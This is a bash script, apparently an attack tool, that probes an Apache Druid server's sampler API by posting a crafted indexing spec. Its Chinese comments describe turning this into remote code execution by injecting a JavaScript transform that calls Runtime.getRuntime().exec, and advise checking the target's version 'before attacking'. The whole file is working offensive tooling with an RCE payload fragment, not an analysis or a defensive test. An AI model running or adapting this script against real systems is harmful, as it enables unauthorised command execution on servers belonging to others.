#!/usr/bin/env bash
TARGET="${1:?usage: bash druid.sh http://TARGET:8888}"
B="${TARGET%/}"
curl -sS -m 8 -o /dev/null -w 'status=%{http_code}\n' "$B/status"
cat > runs/druid-sampler.json <<'JSON'
{
  "type": "index",
  "spec": {
    "ioConfig": {
      "type": "index",
      "inputSource": { "type": "http", "uris": ["http://127.0.0.1:1/"] },
      "inputFormat": { "type": "json" }
    },
    "dataSchema": {
      "dataSource": "rtprobe",
      "parser": { "parseSpec": { "format": "json", "timestampSpec": {}, "dimensionsSpec": {} } },
      "metricsSpec": [],
      "granularitySpec": { "type": "uniform", "segmentGranularity": "DAY" }
    },
    "tuningConfig": { "type": "index" }
  },
  "samplerConfig": { "numRows": 1 }
}
JSON
curl -sS -m 20 -X POST "$B/druid/indexer/v1/sampler" \
  -H 'Content-Type: application/json' --data @runs/druid-sampler.json | head -c 600
# 判定：返回 JSON 里出现解析结果/异常栈 = 接口可达；真正的 RCE 要在 spec.transform 里塞
#   {"type":"javascript","function":"function(){ ... Runtime.getRuntime().exec('id') ... }"}
# 注意：JS transform 只在旧版本默认开启，新版需显式配置；打之前先确认版本。
